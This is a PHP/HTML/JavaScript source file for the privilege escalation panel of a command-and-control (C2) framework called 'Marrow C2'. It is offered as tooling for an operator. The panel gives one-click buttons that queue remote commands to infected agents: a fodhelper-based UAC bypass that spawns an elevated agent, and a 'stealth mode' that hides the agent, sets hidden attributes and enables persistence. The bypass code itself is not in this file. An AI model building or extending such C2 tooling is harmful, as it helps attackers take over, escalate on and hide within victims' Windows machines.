<?php
// Marrow C2 - Privilege Escalation Module
// Check privilege level and attempt UAC bypass
?>
<div id="priv-container" class="h-full flex flex-col bg-[#030712]">
    <!-- Header -->
    <div class="h-12 bg-[#0a0f1a] border-b border-[#1e2433] flex items-center justify-between px-4">
        <span class="text-white font-medium">👑 Privilege Escalation</span>
        <button onclick="PRIV.check()"
            class="px-4 py-2 bg-[#6366f1] hover:bg-[#5558e3] text-white rounded-lg text-sm font-medium">
            🔄 Refresh Status
        </button>
    </div>

    <!-- Content -->
    <div class="flex-1 p-6 overflow-auto">
        <!-- Current Status -->
        <div class="bg-[#0f1219] border border-[#1e2433] rounded-2xl p-6 mb-6">
            <h3 class="text-lg font-bold text-white mb-4">Current Privilege Level</h3>
            <div class="grid grid-cols-2 gap-4">
                <div class="bg-[#1a1f2e] rounded-xl p-4">
                    <div class="text-xs text-gray-500 uppercase tracking-wider mb-1">Status</div>
                    <div id="priv-status" class="text-2xl font-bold text-yellow-400">Standard</div>
                </div>
                <div class="bg-[#1a1f2e] rounded-xl p-4">
                    <div class="text-xs text-gray-500 uppercase tracking-wider mb-1">Is Admin</div>
                    <div id="priv-admin" class="text-2xl font-bold text-red-400">No</div>
                </div>
                <div class="bg-[#1a1f2e] rounded-xl p-4">
                    <div class="text-xs text-gray-500 uppercase tracking-wider mb-1">Username</div>
                    <div id="priv-user" class="text-lg text-white font-mono">--</div>
                </div>
                <div class="bg-[#1a1f2e] rounded-xl p-4">
                    <div class="text-xs text-gray-500 uppercase tracking-wider mb-1">Can Escalate</div>
                    <div id="priv-can" class="text-2xl font-bold text-green-400">Yes</div>
                </div>
            </div>
        </div>

        <!-- Escalation Methods -->
        <div class="bg-[#0f1219] border border-[#1e2433] rounded-2xl p-6">
            <h3 class="text-lg font-bold text-white mb-4">UAC Bypass Methods</h3>

            <div class="space-y-3">
                <!-- Fodhelper -->
                <div class="bg-[#1a1f2e] rounded-xl p-4 flex items-center justify-between">
                    <div>
                        <div class="text-white font-medium">Fodhelper Bypass</div>
                        <div class="text-xs text-gray-500 mt-1">Uses fodhelper.exe autoelevate to bypass UAC</div>
                    </div>
                    <button onclick="PRIV.escalate('fodhelper')"
                        class="px-4 py-2 bg-[#ef4444] hover:bg-[#dc2626] text-white rounded-lg text-sm font-medium">
                        🚀 Execute
                    </button>
                </div>

                <!-- Note -->
                <div class="bg-[#1a1f2e]/50 rounded-xl p-4 border border-yellow-500/30">
                    <div class="flex items-start gap-3">
                        <span class="text-2xl">⚠️</span>
                        <div>
                            <div class="text-yellow-400 font-medium">Important</div>
                            <div class="text-xs text-gray-400 mt-1">
                                Successful escalation will spawn a new elevated agent process.
                                You will see a new target appear in your targets list with "Elevated" integrity.
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Stealth Mode -->
        <div class="bg-[#0f1219] border border-[#1e2433] rounded-2xl p-6 mt-6">
            <h3 class="text-lg font-bold text-white mb-4">🔒 Stealth Mode</h3>
            <div class="flex items-center justify-between">
                <div>
                    <div class="text-gray-300">Enable full stealth mode</div>
                    <div class="text-xs text-gray-500 mt-1">Copies agent to hidden location, enables persistence, sets
                        hidden attributes</div>
                </div>
                <button onclick="PRIV.stealth()"
                    class="px-6 py-3 bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white rounded-xl font-medium">
                    🥷 Enable Stealth
                </button>
            </div>
        </div>
    </div>

    <!-- Log -->
    <div class="h-32 bg-[#0a0f1a] border-t border-[#1e2433] p-4">
        <div class="text-xs text-gray-500 uppercase tracking-wider mb-2">Log</div>
        <div id="priv-log" class="h-16 overflow-auto text-xs font-mono text-gray-400 space-y-1">
            <div>Ready. Click "Refresh Status" to check current privileges.</div>
        </div>
    </div>
</div>

<script>
    const PRIV = {
        log(msg) {
            const el = document.getElementById('priv-log');
            const time = new Date().toLocaleTimeString();
            el.innerHTML += `<div>[${time}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        },

        check() {
            this.log('Checking privilege level...');
            queueCommand('privilege_check');
        },

        escalate(method) {
            if (!confirm('Attempt UAC bypass? This will spawn a new elevated agent.')) return;
            this.log(`Attempting ${method} bypass...`);
            queueCommand('privilege_escalate');
        },

        stealth() {
            if (!confirm('Enable stealth mode? This will hide the agent and enable persistence.')) return;
            this.log('Enabling stealth mode...');
            queueCommand('stealth_enable');
        },

        render(data) {
            try {
                const info = JSON.parse(data);

                document.getElementById('priv-status').textContent = info.integrity || 'Unknown';
                document.getElementById('priv-status').className = 'text-2xl font-bold ' +
                    (info.integrity === 'Elevated' ? 'text-green-400' : 'text-yellow-400');

                document.getElementById('priv-admin').textContent = info.isAdmin ? 'Yes' : 'No';
                document.getElementById('priv-admin').className = 'text-2xl font-bold ' +
                    (info.isAdmin ? 'text-green-400' : 'text-red-400');

                document.getElementById('priv-user').textContent = info.username || '--';

                document.getElementById('priv-can').textContent = info.canElevate ? 'Yes' : 'No';
                document.getElementById('priv-can').className = 'text-2xl font-bold ' +
                    (info.canElevate ? 'text-green-400' : 'text-gray-400');

                this.log('Status updated: ' + info.integrity);
            } catch (e) {
                this.log('Result: ' + data);
            }
        }
    };
</script>